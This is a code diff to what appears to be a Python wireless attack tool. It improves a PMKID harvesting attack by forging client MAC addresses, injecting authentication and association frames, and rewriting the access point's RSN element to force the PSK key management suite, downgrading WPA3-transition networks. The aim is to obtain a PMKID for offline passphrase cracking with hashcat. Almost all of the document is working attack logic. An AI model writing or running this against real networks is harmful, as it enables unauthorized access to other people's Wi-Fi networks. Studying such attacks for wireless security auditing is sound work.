@@ -3,7 +3,9 @@
 Sequence per attempt:
     1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
     2. Listen briefly for Auth Resp (status=0 means the AP will engage).
-    3. Inject Assoc Req carrying the AP's exact RSN IE + SSID + rates.
+    3. Inject Assoc Req carrying a forced-PSK RSN IE (the AP's ciphers, AKM=PSK)
+       + SSID + rates — a client selects one AKM, and PSK is what yields a
+       harvestable PMKID; we bail first if the AP offers no PSK AKM.
     4. Wait for the AP's EAPOL M1 — many WPA2-PSK APs ship a PMKID KDE in
        the Key Data. The existing frame parser surfaces it as
        ``parsed['eapol_pmkid']`` and the WlanInterface populates
@@ -39,6 +41,7 @@ class PmkidFail(enum.Enum):
     """Why a PMKID harvest failed — the UI maps each to a short display line
     (engine stays markup-free; presentation/length live in the view)."""
     PMF_REQUIRED = "pmf_required"   # AP only associates protected (802.11w) clients
+    NO_PSK_AKM = "no_psk_akm"       # AP offers no PSK AKM to harvest (e.g. SAE-only)
     NO_KDE = "no_kde"               # M1 arrived but carried no PMKID KDE
     NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)
 
@@ -67,6 +70,39 @@ _GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")
 # suppress a harvest on a WPA3-transition AP whose beacon also advertises SAE.
 _AKM_PSK = 0x02
 
+# AKMs whose PMK we can harvest *and* crack offline. PSK (00-0F-AC:2) is the only
+# one with a hashcat mode (WPA*01) today; PSK-variants / others are crackable in
+# principle but lack out-of-the-box tooling — add them here when that lands.
+_HARVESTABLE_AKMS = (_AKM_PSK,)
+
+
+def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK) -> Optional[bytes]:
+    """Rewrite an RSN IE's AKM list to a single ``00-0F-AC:akm`` suite (PSK by
+    default), preserving version + group + pairwise ciphers and everything after
+    the AKM list (RSN caps, PMKID list, group-mgmt cipher). Returns None if the IE
+    is too short / malformed (caller falls back to a generic PSK IE).
+
+    An Assoc Req should *select* one AKM; echoing the AP's full list claims SAE on
+    a WPA3-transition AP and gets us ignored. Forcing PSK runs the PSK 4-way →
+    PMKID in M1. RSNE body layout: version(2) group(4) pw_count(2) pw(4*n)
+    akm_count(2) akm(4*m) [caps(2)] [pmkid...] [group-mgmt(4)]."""
+    if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
+        return None
+    body = rsn_ie[2:2 + rsn_ie[1]]
+    if len(body) < 8:
+        return None
+    pw_count = int.from_bytes(body[6:8], "little")
+    akm_off = 8 + 4 * pw_count
+    if akm_off + 2 > len(body):
+        return None
+    akm_count = int.from_bytes(body[akm_off:akm_off + 2], "little")
+    akm_end = akm_off + 2 + 4 * akm_count
+    if akm_end > len(body):
+        return None
+    new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
+    new_body = body[:akm_off] + new_akm + body[akm_end:]
+    return bytes([0x30, len(new_body)]) + new_body
+
 
 def _str_to_mac(mac: str) -> bytes:
     return bytes(int(x, 16) for x in mac.split(":"))
@@ -94,6 +130,8 @@ class PmkidHarvestAttack:
         # Set by run() on failure to the specific cause (PMF / PMKID-less M1 /
         # silent), so the UI reports why instead of guessing.
         self.fail_reason: Optional[PmkidFail] = None
+        # The Assoc RSN IE (single AKM=PSK), rebuilt from the AP's ciphers in run().
+        self._assoc_rsn_ie: bytes = _GENERIC_RSN_IE
         # Register with the interface so client/handshake registration
         # ignores these MACs (they're not real clients).
         self.iface.register_forged_mac(self.source_mac)
@@ -146,11 +184,9 @@ class PmkidHarvestAttack:
         # Tag 50: Extended Supported Rates
         ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
 
-        # Tag 48: RSN IE — echo the AP's exact bytes if we have them, else
-        # fall back to a generic WPA2-PSK-CCMP IE.
-        rsn_ie = self.target.rsn_ie or _GENERIC_RSN_IE
-
-        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + rsn_ie
+        # Tag 48: RSN IE — a single forced AKM=PSK over the AP's ciphers (built in
+        # run()); generic PSK-CCMP if we had no usable AP IE.
+        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + self._assoc_rsn_ie
         return mac_hdr + body
 
     def _build_deauth(self) -> bytes:
@@ -212,6 +248,20 @@ class PmkidHarvestAttack:
             logger.info("[PMKID] %s is PMF-Required — unharvestable, skipping.",
                         self.target.bssid)
             return None
+
+        # Force a single AKM = PSK in our Assoc IE (a client selects one AKM;
+        # echoing the AP's full list claims SAE on a WPA3-transition AP and gets us
+        # ignored). Bail if the AP offers no harvestable (PSK) AKM at all.
+        akm = next((a for a in _HARVESTABLE_AKMS
+                    if a in (self.target.akm_suites or ())), None)
+        if akm is None:
+            self.fail_reason = PmkidFail.NO_PSK_AKM
+            logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
+                        self.target.bssid, self.target.akm_suites)
+            return None
+        self._assoc_rsn_ie = (
+            _force_psk_akm(self.target.rsn_ie, akm) if self.target.rsn_ie else None
+        ) or _GENERIC_RSN_IE
 
         # Make sure we're on the AP's channel — Focus already tunes here,
         # but be defensive.
